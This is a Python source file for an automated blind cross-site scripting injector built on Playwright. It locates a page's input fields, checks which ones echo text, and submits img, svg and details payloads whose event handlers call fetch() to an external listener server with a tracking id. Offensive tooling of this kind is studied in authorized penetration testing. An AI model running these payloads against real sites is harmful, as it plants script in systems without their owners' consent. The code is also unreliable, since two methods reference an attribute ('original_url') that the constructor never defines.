from playwright.sync_api import Page, Browser, TimeoutError as PlaywrightTimeoutError
from typing import Any
from ...recon.web_crawler import page_reload
from ..server.xss_http_server import registrar_payload_injetado

class XSSScanner:
    """
    A class to perform XSS scanning on a web page.
    """
    def __init__(self, page: Page, browser: Browser, url_ouvinte: str, url_original: str, playwright_instance: Any):
        """
        Initializes the XSSScanner.

        Args:
            page: The Playwright Page object.
            browser: The Playwright Browser object.
            url_ouvinte: The URL of the listener server.
            url_original: The original URL of the page being scanned.
            playwright_instance: The Playwright instance.
        """
        self.page = page
        self.browser = browser
        self.url_ouvinte = url_ouvinte
        self.url_original = url_original
        self.playwright_instance = playwright_instance
        self.injected_payloads = []
        self.campos_validos = []

    def _build_payloads(self, payload_id=None):
        """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
        payloads = []
        url_with_id = f"{self.url_ouvinte}?id={payload_id}" if payload_id else self.url_ouvinte
        payloads_models = [
            "<img src=x onerror=fetch('{url_ouvinte}')>",
            "<svg onload=fetch('{url_ouvinte}')>",
            "<details open ontoggle=fetch('{url_ouvinte}')>",
        ]
        for model in payloads_models:
            payloads.append(model.format(url_ouvinte=url_with_id))
        return payloads

    def _get_payload_types(self):
        """Retorna os tipos de payloads disponíveis"""
        return ["img", "svg", "details"]

    def _eco_verificator(self, eco_text):
        """Verifica se o texto enviado foi processado corretamente."""
        try:
            self.page.wait_for_load_state("domcontentloaded", timeout=10000)
            body_text = self.page.locator("body").inner_text()
            if eco_text in body_text:
                return True
            return False
        except Exception as e:
            print(f"An error occurred during verification: {e}")
            return False

    def _activate_mat_input_field(self, field_id="mat-input-1"):
        """Ativa especificamente o campo mat-input-1 (barra de pesquisa)
        usando Playwright"""
        try:
            input_field = self.page.locator(f"#{field_id}")
            if input_field.is_visible() and input_field.is_editable():
                input_field.focus()
                return input_field
            if input_field.is_visible():
                input_field.focus()
                input_field.click()
                self.page.wait_for_timeout(500)
                if input_field.is_editable():
                    return input_field
            search_selectors = [
                "mat-icon.mat-search_icon-search",
                ".mat-search_icons mat-icon:has-text('search')",
                "span.mat-search_icons mat-icon[class*='search']",
            ]
            for selector in search_selectors:
                try:
                    search_icon = self.page.locator(selector).first
                    if search_icon.count() > 0:
                        search_icon.click(timeout=3000)
                        print(f"Ícone de busca clicado com seletor: {selector}")
                        input_field.wait_for(state="visible", timeout=5000)
                        input_field.focus()
                        input_field.click()
                        self.page.wait_for_timeout(500)
                        if input_field.is_editable():
                            return input_field
                        else:
                            self.page.wait_for_timeout(1000)
                            if input_field.is_editable():
                                return input_field
                except PlaywrightTimeoutError:
                    continue
            print(f"Não foi possível ativar o campo {field_id}")
            return None
        except Exception as e:
            print(f"Erro ao ativar campo {field_id}: {e}")
            return None

    def _find_field_element(self, element):
        """Encontra um elemento de campo usando diferentes
        estratégias com Playwright"""
        input_field = None
        if element["id"]:
            try:
                input_field = self.page.locator(f"#{element['id']}")
                input_field.click(timeout=5000)
                input_field.wait_for(state="visible", timeout=5000)
                return input_field
            except PlaywrightTimeoutError:
                input_field = None
        if not input_field and element["name"]:
            try:
                input_field = self.page.locator(f"[name='{element['name']}']")
                input_field.click(timeout=5000)
                input_field.wait_for(state="visible", timeout=5000)
                return input_field
            except PlaywrightTimeoutError:
                input_field = None
        return input_field

    def _submit_form(self, input_field):
        """Submete o formulário usando diferentes estratégias com Playwright"""
        try:
            submit_button = self.page.locator("button[type='submit']").first
            submit_button.click(timeout=3000)
            return
        except PlaywrightTimeoutError:
            pass
        try:
            login_button = self.page.locator("button:has-text('Log in')").first
            login_button.click(timeout=3000)
            return
        except PlaywrightTimeoutError:
            pass
        try:
            login_btn = self.page.locator("#loginButton")
            if login_btn.count() > 0:
                login_btn.click(timeout=3000)
                return
        except PlaywrightTimeoutError:
            pass
        try:
            input_field.press("Enter")
        except Exception:
            pass

    def _return_to_original_page(self):
        """Volta para a página original e fecha modais usando Playwright"""
        try:
            current_url = self.page.url
            if current_url != self.original_url:
                self.page.goto(self.original_url, wait_until="domcontentloaded", timeout=10000)
                self.page.wait_for_timeout(2000)
                try:
                    close_button = self.page.locator(
                        "button[class*='close'], button[aria-label*='close'], "                         "button:has-text('x')"
                    )
                    close_button.first.click(timeout=2000)
                except PlaywrightTimeoutError:
                    try:
                        dismiss_button = self.page.locator(
                            "button:has-text('Dismiss'), button:has-text('OK')"
                        )
                        dismiss_button.first.click(timeout=2000)
                    except PlaywrightTimeoutError:
                        try:
                            backdrop = self.page.locator(".cdk-overlay-backdrop")
                            backdrop.click(timeout=2000)
                        except PlaywrightTimeoutError:
                            try:
                                self.page.keyboard.press("Escape")
                            except Exception:
                                pass
        except Exception as e:
            print(f"Erro ao verificar/voltar página: {e}")

    def _eco_test(self, lista, test_text):
        """Função de teste para enviar um texto nos campos de input usando Playwright."""
        results = []
        for element in lista:
            try:
                input_field = None
                if element.get("type") in ["checkbox", "radio", "submit", "button"]:
                    continue
                if element.get("id") == "mat-input-1":
                    input_field = self._activate_mat_input_field("mat-input-1")
                    if not input_field:
                        results.append(
                            {
                                "element": element,
                                "status": "failed",
                                "error": "Campo de busca mat-input-1 não pode ser ativado",
                            }
                        )
                        continue
                else:
                    input_field = self._find_field_element(element)
                if input_field:
                    input_field.clear()
                    input_field.fill(test_text)
                    self._submit_form(input_field)
                    self.page.wait_for_timeout(2000)
                    current_url = self.page.url
                    eco_result = False
                    if current_url != self.original_url:
                        eco_result = self._eco_verificator(test_text)
                    else:
                        eco_result = self._eco_verificator(test_text)
                    results.append(
                        {
                            "element": element,
                            "status": "success",
                            "payload_sent": test_text,
                            "eco_text": eco_result,
                        }
                    )
            except Exception as e:
                results.append({"element": element, "status": "failed", "error": str(e)})
            self._return_to_original_page()
        return results

    def _blind_xss_injection(self):
        """Injeta payloads blind XSS - estratégia 'disparar e esquecer' usando Playwright"""
        injected_payloads = []
        try:
            for campo in self.campos_validos:
                element = campo["element"]
                field_name = element.get("name") or element.get("id")
                field_id = element.get("id")
                payload_types = self._get_payload_types()
                for payload_type in payload_types:
                    try:
                        print(f"Recarregando página para payload {payload_type} no campo {field_name}")
                        self.page, self.browser = page_reload(
                            self.page, self.browser, self.url_original, self.playwright_instance
                        )
                        if not self.page:
                            print("Falha ao recarregar a página")
                            continue
                        payload_id = registrar_payload_injetado(
                            campo_id=field_id,
                            campo_name=field_name,
                            payload=f"payload_{payload_type}",
                            url_origem=self.url_original,
                        )
                        payloads = self._build_payloads(payload_id)
                        payload = (
                            payloads[0]
                            if payload_type == "img"
                            else payloads[1]
                            if payload_type == "svg"
                            else payloads[2]
                        )
                        if element.get("id") == "mat-input-1":
                            input_field = self._activate_mat_input_field("mat-input-1")
                            if not input_field:
                                print("Campo de busca mat-input-1 não pode ser ativado")
                                continue
                        else:
                            input_field = self._find_field_element(element)
                        if not input_field:
                            print(f"Não foi possível encontrar o campo {field_name}")
                            continue
                        input_field.clear()
                        input_field.fill(payload)
                        self._submit_form(input_field)
                        self.page.wait_for_timeout(2000)
                        injected_payloads.append(
                            {
                                "payload_id": payload_id,
                                "payload": payload,
                                "field_name": field_name,
                                "payload_type": payload_type,
                                "status": "injected",
                            }
                        )
                        print(f"Payload {payload_id} ({payload_type}) injetado no campo {field_name}")
                    except Exception as e:
                        print(f"Falha ao injetar payload no campo {field_name}: {e}")
                        continue
        except Exception as e:
            print(f"An error occurred during blind XSS injection testing: {e}")
            return []
        return injected_payloads

    def run_scan(self, campos_interativos: list):
        """Executa o scan de XSS completo"""
        print("Iniciando varredura de XSS...")
        print("Iniciando teste de eco...")
        eco_test_text = "test-eco-gemini"
        eco_results = self._eco_test(campos_interativos, eco_test_text)
        self.campos_validos = [res for res in eco_results if res.get("eco_text")]
        print(f"Campos válidos encontrados: {len(self.campos_validos)}")
        if not self.campos_validos:
            print("Nenhum campo válido para injeção de XSS encontrado.")
            return []
        print("Iniciando injeção de payloads blind XSS...")
        self.injected_payloads = self._blind_xss_injection()
        print("Varredura de XSS concluída.")
        return self.injected_payloads
